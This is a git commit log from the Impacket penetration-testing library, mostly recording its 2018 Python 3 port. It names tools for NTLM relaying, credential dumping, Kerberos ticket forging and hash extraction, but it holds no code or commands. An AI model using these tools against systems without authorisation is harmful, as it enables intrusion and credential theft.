    Fixing ntlmrelayx.py errors when running with -smb2support

commit 793605ac29cff9640c54be6216f96416925fe0ad
Merge: caa8c541 9efa50fe
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 22 14:52:30 2018 -0300

    Merge branch 'master' into python36

commit 9efa50fe55a2aa1d6fa06d3f5a4d729f388b39aa
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 22 14:50:42 2018 -0300

    Avoid aborting when a decode fails
    
    - Althought it shouldn't happen, we found an instance where bypassing the decoding error will allow the script to continue and successfuly parse a DIT file. More research needed.
    - Should address https://github.com/SecureAuthCorp/impacket/issues/503

commit caa8c5418c14e7616458caa3ad45737966f1f64f
Merge: c996765f a8c05f42
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 21 19:55:12 2018 -0300

    Merge branch 'fox-it-python36' into python36

commit a8c05f424cf360cc89fb06a4f927d9502a1406f6
Merge: 6fe7db58 8f95732f
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 21 19:54:55 2018 -0300

    Merge branch 'python36' of https://github.com/fox-it/impacket into fox-it-python36

commit 8f95732fdff73e508d63af9326f1245d9542e9a6
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Oct 21 22:25:44 2018 +0200

    Small bugfixes pointed out by pylint

commit 996c586403a3b7b76d6fcced9e6b64dd2facd317
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Oct 21 12:10:25 2018 +0200

    ldap attack port to py3 wrapup and bugfixes

commit 429c4b77fc63655499088a02bc89f0290ec7bad1
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 21:21:44 2018 +0200

    ldap attack port to py3 part 1

commit c996765f1b61e1abcd002ea5640258a6b0cefe76
Merge: 6b6d496b dac0ad19
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 16:47:41 2018 -0300

    Merge branch 'master' into python36

commit dac0ad199c19e7e3ae6daaba0b5afd39d3a8427c
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 15:53:08 2018 -0300

    Adding extra debugging data

commit 6b6d496bdf6a1dfd4ea279a3771d422e4be81bb0
Merge: 81304e33 55bfef0e
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 14:09:37 2018 -0300

    Merge branch 'python36' of https://github.com/SecureAuthCorp/impacket into python36

commit 55bfef0e1a22e7e32fa3e28ec9e1f4db4a2ba8f5
Merge: f041099a 4df178ac
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Oct 18 14:07:17 2018 -0300

    Merge pull request #506 from fox-it/python36
    
     py3 fix for egg installs and imports

commit 6fe7db58baf9fe3e918b64366ab18282e81243fd
Merge: 81304e33 4df178ac
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 14:02:31 2018 -0300

    Merge branch 'python36' of https://github.com/fox-it/impacket into fox-it-python36

commit 81304e3362093ac9db0579ae9a11842cb0da25e9
Merge: f041099a a570dbce
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 14:02:04 2018 -0300

    Merge branch 'master' into python36

commit a570dbce64e3c6203b944d40eb7830d83b631a5c
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 13:58:08 2018 -0300

    Adding traceback info when running in debug mode

commit 4df178ac600c0561e68b2e7331d3fe2e61612134
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 18:48:16 2018 +0200

    Also fixed socks plugins

commit 760e78c1ad705a4dbdc00132891e8f0930ef8051
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 18:02:52 2018 +0200

    Documented motivation for change better

commit 4fe4eb5422cbba83b579de837a8a4a22f572aa56
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 18:01:22 2018 +0200

    py3 fix for egg installs and imports

commit f041099a395d289092a35a06b1a986aaeefdd5fc
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 17 18:45:39 2018 -0300

    split.py Python3 port
    
    - I modified the original example just to simplfy some things. Not ideal but it will serve the purpose of it.

commit eced356cff9d4e92768ca62a364c423daab67111
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 17 16:40:24 2018 -0300

    ntfs-read.py Python3 port

commit 73633dcc0643053e50e9e95b7b52c8d900626937
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 17 12:11:20 2018 -0300

    sniffer.py Python3 port

commit b4a8db6027e50232ea1863d5426c1a4ffead6673
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 17 12:05:40 2018 -0300

    sniff.py Python3 port

commit 3b725fb82d7a28491f5ca34bdb880cc93fbf31f0
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 21:07:10 2018 -0300

    Dot11 testcases Python3 port
    
    - Not all tests yet passing but almost there

commit ea5fbbb28759fdea9c7f9b52158c38e8c333b586
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 16:54:40 2018 -0300

    ImpactPacket remaining test cases ported to Python3

commit e5aca347865d0e6210cd42d9aa1783c039b5fc06
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 16:34:09 2018 -0300

    test_TCP.py example Python3 port

commit e7899fbd2cd52dc9c50361f57701df874e3af97f
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 16:01:57 2018 -0300

    dns.py Python3 port

commit a339e62611ca63f0e31e128fd219988a38247ca2
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 14:03:22 2018 -0300

    registry-read.py Python3 port

commit 92f849c541e8ce85ec722297dd769059b8fcbfc9
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 13:10:21 2018 -0300

    rdp_check.py Python3 port

commit 02f872312214433b71a861dc83842edb36d63b37
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 13:02:01 2018 -0300

    Initial ntlmrelayx.py Python3 port
    
    - Lots of testing needed, there will mostly be opened bugs both on PY2 and PY3, please test on both versions.
    - ldapdomaindump (cc dirkjanm) does not support Python3 so this attack is not available in the PY3 version (until port for that module is done)

commit 62b0cc65175849e29cd4d087d70dad2c549e2bfe
Author: asolino <bethus@gmail.com>
Date:   Sat Oct 13 20:24:48 2018 -0300

    smbrelayx.py Python3 port
    
    - All related modules ported as well
    - ntlmrelayx.py coming next

commit 2425c0823537c430896c14c0e6f42319ebfb2917
Author: asolino <bethus@gmail.com>
Date:   Sat Oct 13 11:44:45 2018 -0300

    raiseChild.py Python3 port

commit 2bddcc68ed396c2dda2810c6492d28bc5c9b40e8
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 12 17:26:51 2018 -0300

    Adding future as a package req

commit d8aada311ab6176b21287dc3471a3aafed887430
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 12 17:02:46 2018 -0300

    Mimikatz.py Python3 port
    
    - test_mimilib.py and mimilib.py ports as well

commit 948deadebe4d963b421b4fe7629d872f6ec51cc6
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 12 16:39:47 2018 -0300

    mssqlclient.py, mssqlinstance.py Python3 ports
    
    - tds.py ported as well

commit 1d94b7f8ea5396d748a69f96552eb05756d110f2
Merge: 94ec775f 9a0947d3
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:45:17 2018 -0300

    Merge branch 'master' into python36

commit 9a0947d3c0b396321cb61c51a45a9e736c8532c4
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:45:03 2018 -0300

    Deleting unreachable code

commit 4473816f9247e5f42e08e23f78cf36dd52adb680
Merge: 9aa29f25 d8f13943
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Oct 11 18:44:30 2018 -0300

    Merge pull request #497 from cclauss/patch-1
    
    Don't forget self...  Undefined name: data --> self.data

commit 94ec775fa6da173f3e3e5467db6536bed94779a9
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:32:32 2018 -0300

    Fixing imports

commit f70d0cc847b1f197f641edfb52f2876d0274c776
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:21:05 2018 -0300

    Adding py36 envtest. Not all tests passing tho.

commit 16d658e4d9277167125c4fd5c7bff2874959bc35
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:02:52 2018 -0300

    RPC NRPC port for Python3
    
    - test_nrpc.py passing (PY2/PY3)

commit 3e911898b36918e412f596dbed56a2cc4efed9a3
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:37:35 2018 -0300

    karmaSMB.py Python3 port

commit b69cb4932c7a369e5209d11b72526466d719ed50
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:24:03 2018 -0300

    sambaPipe.py initial Python3 port

commit 48d1115264bdbcd4b1495aa1d592f6447057bf2b
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:21:25 2018 -0300

    GetADUsers.py Python3 port

commit a9dec87e4d01c60da96b810a4f0af09422b02f92
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:10:40 2018 -0300

    GetNPUSers.py Python3 port

commit f3e43b8b807e174ac28f51cf5fc6c7e6d9d1f273
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 12:54:35 2018 -0300

    Fixing -outputfile scenario in Python3

commit 279cc0e11b6bba639669396677cf3aa9e448b2af
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 22:51:11 2018 -0300

    Minor fixes detected when running test cases

commit ba29ac60822827850d5474702d6389bfe6c9cf85
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 22:50:18 2018 -0300

    GetUserSPNs.py Python3 port
    
    - test_ldap.py passing (PY2 / PY3)

commit eba021977a75b701ab32d7014fe948168bb6ccc1
Merge: 61d4282b 9aa29f25
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 18:24:44 2018 -0300

    Merge branch 'master' into python36

commit 61d4282b5da76621bb7618a535f1abed324878fa
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 18:24:22 2018 -0300

    smbserver.py and smbexec.py Python3 port

commit 9aa29f251511dd7d18d24f794526698e28a3fe88
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 10 15:51:06 2018 -0300

    Update README.md

commit 63429c46a7b0ad06913bcb930b2c8c869892dada
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 15:48:56 2018 -0300

    So long and thanks for all the bits Core :)
    
    - Still need to change each file's copyright, coming soon

commit 5de6ff018f997ae3ad73e245ff2dc27ae8bb1f95
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 17:19:33 2018 -0300

    test_ndr.py ported to Python3

commit 4e67af4ef1b40ac86792eec1dbae86457b8c6115
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 13:40:20 2018 -0300

    netview.py Python3 port

commit 62f32007b61579810895edfe873156460b3ed515
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 13:27:10 2018 -0300

    ifmap.py and opdump.py Python3 ports

commit 1c5c275dad80fb68b63f290d69e6d46dee36eeab
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 13:22:08 2018 -0300

    goldenPac.py port to Python3

commit 8ff82b5e13a0ecbb111841ceac421033880df656
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 12:46:19 2018 -0300

    ticketer.py port to Python3

commit de513d7b43c183d24d6e3c8431206bd6dc51e380
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 17:45:53 2018 -0300

    getST.py port to Python3

commit 960ba26b6493d2d05f9dab05b050adb9dbbeb4f2
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 16:24:29 2018 -0300

    getArch.py Python3 port

commit 01ff739dfb5a0af54289428827fc5ac3d3aa01b4
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 16:22:39 2018 -0300

    getTGT.py and getPac.py Python3 port

commit 13499763e0297d06cb4897636a2b60ff70d2ec44
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 16:21:57 2018 -0300

    Adjusting CCACHE manipulation for Python3

commit 752f8c2a6ead576bc626966b237a467390f2ca08
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 13:27:19 2018 -0300

    If we have an object that can serialize itself, go ahead

commit 3ee4f5a07659c9e240e7c7c46d04004614373db2
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 13:12:27 2018 -0300

    Getting ready for Python3 port
    
    - Getting rid of unnecesary str()
    - Using getData() when neccesary

commit 041da62dc9d31dc8f3791b60ab06277a5cd7dbbb
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 13:04:17 2018 -0300

    We shouldn't be decoding first
    
    - Unless we receive bytes(), but we shouldn't (yet)

commit 89954d7577206537751812c281799dc6a2fb8b7d
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 5 17:34:31 2018 -0300

    DCOM WMI port for Python3
    
    - test_wmi.py passing (PY2 / PY3)
    - secretsdump.py, wmiexec.py, wmipersist.py and wmiquery.py ports as well.

commit 512329c54fbc0fed63e709100f582da830560651
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 5 17:32:11 2018 -0300

    dcomexec.py port to Python3

commit a08db9f6442d9c036bf19d223751856a45584479
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 5 17:11:51 2018 -0300

    ESE engine port for Python
    
    - esentutl.py example ported as well.

commit 7bd587a302c891264c19b7df5ea4a0cb886ae0c8
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 17:11:12 2018 -0300

    DCOMRT port for Python3
    
    - test_dcomrt.py passing (PY2/PY3)

commit 3d64d6f2865b74b768869fedde65df7543e56698
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:34:03 2018 -0300

    RPC BKRP port for Python3
    
    - test_bkrp.py passing (PY2/PY3)

commit f7d452a1c677d3b26529394f4e1ca72f267cccb5
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:26:36 2018 -0300

    RPC DHCPM port for Python3
    
    - test_dhcpm.py passing (PY2/PY3)

commit 6ed6a6f68920688901fdd322c835e973405a1c93
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:16:14 2018 -0300

    RPC EVEN6 port for Python3
    
    - test_even6.py passing (PY2/PY3)

commit b5196779d343ebbc6c6c8e8ea2cdcf4f5e7da0bb
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:06:22 2018 -0300

    RPC DRSUAPI port for Python3
    
    - test_drsuapi.py passing (PY2/PY3)

commit 0324abcc63458e7cfec7e8a8a4a77198a0146137
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 15:25:04 2018 -0300

    rpcdump.py port for Python3

commit 73d69315add4ee77681df5bcddc63a440958be83
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 14:31:37 2018 -0300

    psexec.py (and related libs) port to Python3

commit 989c19cc91b0de59ef2a78a4fcfb1b6a978b4ec7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 14:06:29 2018 -0300

    RPC RRP port for Python3
    
    - test_rrp.py passing (PY2 / PY3)
    - reg.exe example working

commit bb517ef209a746fd98ba892135fc76d8020853bc
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 11:01:37 2018 -0300

    RPC WKST port for Python3
    
    - test_wkst passing (PY3 / PY2)

commit fecdb81b3e76f9edc8447d605d0ac9b3beafdfa7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:51:39 2018 -0300

    RPC SRVS port for Python3
    
    - test_srvs.py passing (PY2 / PY3)

commit 62d85738bd6078ccafe93fe83844e03d5dad6ef7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:45:47 2018 -0300

    RPC SASEC, TSCH, ATSVC port for Python3
    
    - test_tsch.py passing (PY3 / PY2)
    - atexec.py example working

commit e210c3f60917d494e054ce0127dd6cc1c478ecd8
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:35:48 2018 -0300

    lookupsid.py Python3 support

commit 2751fc39a89d0308c38b01c68967c1b2c965575c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:32:10 2018 -0300

    RPC SCM port for Python3
    
    - test_scmr.py passing (PY2 / PY3)

commit ba10fb52a595f892c7dc1b6e733a36a30604178c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:31:01 2018 -0300

    samrdump.py Python3 port

commit 50d4ba77a21431164aab80c2e7c90f44298f18d6
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 21:52:13 2018 -0300

    RPC SAMR port for Python3
    
    - test_samr.py passing (PY2 / PY3)

commit b30735f2ad3754af7a7b0639580128b5e05984cf
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 17:38:16 2018 -0300

    NMB layer port to Python3
    
    - test_nmb.py passing (PY2/PY3)

commit a45fb7435028b2076702d388fa4438ae30ebcc90
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 15:05:59 2018 -0300

    RPC MGMT port for Python3
    
    - test_mgmt.py passing (PY2/PY3)

commit 535f3296ab86770021b799d4bda2695fb4c11236
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 14:58:49 2018 -0300

    RPC LSAD and LSAT port for Python3
    
    - test_lsad.py and test_lsat.py both passing (PY2/PY3)

commit c82c04d9336c4473e10334104268501f8a5f3891
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 14:37:21 2018 -0300

    EPM and RPCRT port for Python3
    
    - test_epm.py and test_rpcrt.py both passing (PY2/PY3)

commit 0a4c7872b4626bb1ec4fbd750b7573a850f8195a
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 12:59:16 2018 -0300

    Initial smbclient.py and related libs port to Python3
    
    - You should be able to run it with Python2 and 3
    - As a side effect other libs were also initially ported. Not finished and just in the context of smbclient.py

commit f77bf8e25103d8cbdee5a905baeee09ea8fb0a57
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 12:54:02 2018 -0300

    Initial NDR runtime port to Python3
    
    - Python2 testcases still working
    - Python3 unit tests working

commit 49d06bedca6ad4d3246b80c907b25f2cb3767d96
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 1 17:04:43 2018 -0300

    Python3 adaptation
    
    - Getting rid of string.* functions
    - Setting b'' wherever needed
    - Using getData() instead of str()

commit 83898fa4b95a653bdb346b95d3bf305032a0b2c3
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 1 17:00:58 2018 -0300

    Setting binary data on some Py2 strings

commit 35a5503662449db469ea1224a060f61d936f58e5
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:30:16 2018 -0300

    Adjusting SMB3_DIALECT code to Python3

commit 12911cec68c20e82d7056446e43a1cd2092c740d
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:18:58 2018 -0300

    Fixing test cases for Python3

commit 77ecab6aafc76b0a773e89f3d9878b281740f4aa
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:18:05 2018 -0300

    Handle situations where SMB.FLAGS2_UNICODE is used

commit 0bced5dd0eccf0c56ba0cddd4472476061a0914d
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:07:00 2018 -0300

    Fix to handle FLAGS2_UNICODE scenario
    
    1. In the packet, we encode the data
    2. For further calls, we don't

commit 60297cd0ca98b31cceb632dd2d94cdb2aeb5956c
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:06:07 2018 -0300

    Minor indentation fixes

commit d1bf31dcf58b19d78a493669c1be7a2f1daff1af
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:58:58 2018 -0300

    Already receiving bytes, no need to convert

commit c2fc46398444570d7ed17a0d643a8c32cd869004
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:14:20 2018 -0300

    Minimal Python3 ports, lot of stuff left

commit be26e65279fc6c42ee465db20c08302aab96287e
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:13:53 2018 -0300

    Removing lonely raise ;)

commit cadc791ffeb3b189ad6d6e54d08bf00449e20dbc
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:13:24 2018 -0300

    Removing exceptions, and str() for the right pyasn1 representations

commit 470777fcc06e0b613821b2674c5f59fbff990599
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 18:31:10 2018 -0300

    Need to get the Unicode/str representation for later conversion

commit 87595e51572f6ee18b0b3ff90a0b7458c0af11d7
Merge: e3365558 97d36f0d
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 18:30:43 2018 -0300

    Merge branch 'master' into python36

commit e3365558b2f87589db82a939ec98bb03f76e844b
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 10:27:52 2018 -0300

    Porting testcases to Python3
    
    - Slowly :)

commit a5f0b62927ddb6462d3d4121dce742051324781a
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 10:26:32 2018 -0300

    Initial support for Python3 (nmb/smb layer)
    
    - Python3 test cases still not ran
    - Python2 test cases working

commit f4c373008b2fb69f455fca2993127394c340eee8
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 10:22:16 2018 -0300

    Initial Python3 support for Kerberos layer
    
    - Test cases still not working
    - Test cases for Python 2 passing.

commit d8f139435e282ce2d6a5df58f9d8bc9a3b028fac
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Sep 28 22:22:26 2018 +0200

    Don't forget self...  Undefined name: data --> self.data
    
    Partial fix for #494.  __data__ is an _undefined name_ in this context which will probably raise a NameError at runtime but each __Address__ object has a __self.data__ attribute.

commit 97d36f0dae93f0dc94fbc5ff76131e6c87e15918
Merge: 00583949 25c7e067
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 28 12:32:49 2018 -0300

    Merge pull request #496 from cclauss/patch-2
    
    Undefined name: Typo Dot11DataWPADataDecoder --> Dot11WPADataDecoder

commit 0058394905611d49b58a9ea3f7051fe52801a273
Merge: 55c16583 5916277b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 28 12:31:47 2018 -0300

    Merge pull request #495 from cclauss/patch-1
    
    Undefined name: Typo 'max_data' --> 'max_data_len'

commit 25c7e067eef3adcffbb7401a0b53f51760d1349b
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Sep 28 12:32:33 2018 +0200

    Undefined name: Typo Dot11DataWPADataDecoder --> Dot11WPADataDecoder
    
    Partial fix for #494.  __Dot11DataWPADataDecoder__ is an _undefined name_ in this context but  __Dot11WPADataDecoder__ is defined 10 lines below.

commit 5916277b171326537fa6fe2ffc9c51c947edaddd
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Sep 28 12:20:00 2018 +0200

    Undefined name: Typo 'max_data' --> 'max_data_len'
    
    Partial fix for #494.  __max_data__ is an _undefined name_ in this context but __max_data_len__ is defined a few lines above and is used in the conditional on the previous line that triggers the execution of this code.

commit 55c165836f020ecec6019ae0e51d3c4f56c6823a
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 6 15:11:40 2018 -0300

    Adding -port switch used to specify binding port

commit 324ab03caf41e6f63d11b3b20fd0bab81587c51f
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 4 16:41:28 2018 -0300

    Fixing test case

commit 36d57e532dcadf0f628d068e60e09f30e5602916
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 4 16:27:29 2018 -0300

    Removing PyCrypto messages and replacing them with pycryptodomex

commit 6710253f48c2ba4a272154011c5cf35c929761e5
Merge: 982d170d b2541065
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 4 13:40:37 2018 -0300

    Merge branch 'fox-it-pycryptodome'

commit b2541065e2406f37090d2aa6d44a0a8beed48845
Merge: 982d170d 860f7b09
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 31 12:21:32 2018 -0300

    Resolved merge conflict

commit 982d170d11d88b94c76670a505884a97d6ecf4e8
Merge: 554bf731 f22c74b6
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 26 18:42:15 2018 -0300

    Merge branch 'qlemaire-add-decryption-error-exception'

commit f22c74b69107e1f95b0df225229d0961164c2a80
Merge: 554bf731 306cfbdb
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 26 17:06:05 2018 -0300

    Merge branch 'add-decryption-error-exception' of https://github.com/qlemaire/impacket into qlemaire-add-decryption-error-exception

commit 554bf7319d222a409979061ebde0eb3959c495c4
Merge: 3214ddc0 468eff89
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Aug 26 16:07:01 2018 -0300

    Merge pull request #486 from qlemaire/fix-nopreauth-noaes
    
    Fix "no pre-auth and RC4" handling in GetKerberosTGT

commit 3214ddc0cf4c15e607914a3bc498b1dc8dd04a64
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 26 16:05:29 2018 -0300

    Enforcing specific flask version

commit 306cfbdb5238738f05b42c89e60a5ece29c2d901
Author: Quentin Lemaire <sec@quentinlemaire.fr>
Date:   Sun Aug 26 15:15:28 2018 +0200

    Catch decryption error and add context information
    
    When decrypting session key from the AS-REP message, we might
    encounter decryption error such as invalid checksum if the
    provided key is not the right one (when pre-auth is disabled
    for instance).
    
    We now add a SessionKeyDecryptionError exception with context
    information about the decryption error (key, cipher, cipherText
    and AsRep). This may give information to the exception handler
    about what happened.
    
    Finally, the exception handler will be able to compute john hash
    from the exception, which was not possible with the InvalidChecksum
    exception.

commit 468eff89dfb0eed3e538b0da648a1a51fd823670
Author: Quentin Lemaire <sec@quentinlemaire.fr>
Date:   Sun Aug 26 14:25:36 2018 +0200

    Fix "no pre-auth and RC4" handling in GetKerberosTGT
    
    When there was no pre-authentication and server doesn't handle other
    cipher suites than RC4, the encryptionTypesData table remained empty,
    leading to a KeyError while deriving NTLM hash from password.
    
    We now populate the encryptionTypesData table with an empty salt (not
    needed with RC4) when pre-auth is disabled.

commit 860f7b0920d328b289e78e5c77e7f4070d63087b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Aug 25 17:27:53 2018 +0200

    Also update pycryptodome requirement in setup.py

commit 53b4395aa052024c6dce58436288a5ba804bbbc8
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Aug 25 17:25:17 2018 +0200

    Replace pycrypto with pycryptodome

commit 28a3deae4749d867e3610f34492f8312f622c20d
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 22 18:25:29 2018 -0300

    SOCKS support for the supported protocol at non-default ports
    
    * E.g. MSSQL at a random port (not 1433), or HTTP server at 8080.
    * SOCKS Server doesn't look for a handler anymore by inspecting the socksPlugin dictionary but instead looking at the active relays and then extracting the protocol schema from there (this is new) and the using whatever plugin for that schema we have.
    * Now the PLUGIN_SCHEME variable plays a very important role. It must match the scheme used when calling this script (e.g. smb://).
    * Testing is needed to ensure no colateral damage was introduced.
    * Should address https://github.com/CoreSecurity/impacket/issues/483

commit 3fa456ba307abeffc5d15165254f9d37ef6485e4
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 22 18:22:56 2018 -0300

    Fixed -socks support functionality
    
    * Wasn't working before due to all the changes made via ntlmrelayx.py

commit 9b07e5b0e980bfe87bafb2ad3f9c6326127a36e1
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 8 18:31:19 2018 -0300

    Using TLSv1_2_METHOD and adding AES as cipher list for SSL connection
    
    * Also increasing the PyOpenSSL version required to match whatever is needed for this to work
    * Should address https://github.com/CoreSecurity/impacket/issues/429, testing is needed

commit 91bfb763294c6e326e4e91ec38fff8cdc4a3ce3c
Merge: 678a1648 c6d5034b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 8 15:50:15 2018 -0300

    Merge pull request #480 from mohemiv/master
    
    Added different output types for DCC hashes (secretsdump.py)

commit c6d5034b92bf61918ec47947320424ceac88dd00
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Wed Aug 8 18:18:04 2018 +0300

    Changed display name for DCC hashes (secretsdump.py)

commit d37495c32872d578b2f05af32b5ec1c8391f1cd1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Aug 7 21:08:35 2018 +0300

    Added different output types for DCC hashes (secretsdump.py)

commit 678a16485a31555aceabdcf962780768bf413d70
Merge: cf87a712 1ee97ad9
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 6 15:51:47 2018 -0300

    Merge branch '8com-for_upstream/fix_win2016_lm_decryption'

commit 1ee97ad9eff040c30057ed08fb953b5d989eb540
Merge: cf87a712 f6bd611a
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 6 15:49:39 2018 -0300

    Merge branch 'for_upstream/fix_win2016_lm_decryption' of https://github.com/8com/impacket into 8com-for_upstream/fix_win2016_lm_decryption

commit f6bd611a578f6e68628468385a3bda3984a55adb
Author: Michael Niewoehner <michael.niewoehner@8com.de>
Date:   Mon Aug 6 17:14:47 2018 +0200

    Fix Win2016 LM decryption

commit cf87a712977d812211da083801b932d6dc5a9ae1
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 6 13:12:08 2018 -0300

    Returning str in Python2 instead of Unicode for 'z' data type
    
    - Decoding a bytestring and returning Unicode was breaking wmipersist.py functionality. We need to better investigate the reasons tho. This change shouldn't alter any other functionality
    - hexdump under Python3 was broken, now working back again.

commit c47c6c234781b2fcca4fde3536ab5a413f9b964a
Merge: c03e31c2 a15fb570
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 1 13:11:58 2018 -0300

    Merge pull request #478 from MrTchuss/fix_ntlmrelayx-encoding
    
    Fix ntlmrelayx encoding

commit a15fb570cdd72582677b3034190e678497d5f826
Author: MrTchuss <buffer@0x90.fr>
Date:   Wed Aug 1 15:54:35 2018 +0200

    Fixed admin group lookup in ntlmrelayx
    
    Administrators group name change depending on the target locale. It's
    better to rely only on this group RID (544)

commit c41b8bb5018faad5130e91f2ceec56d316b7d502
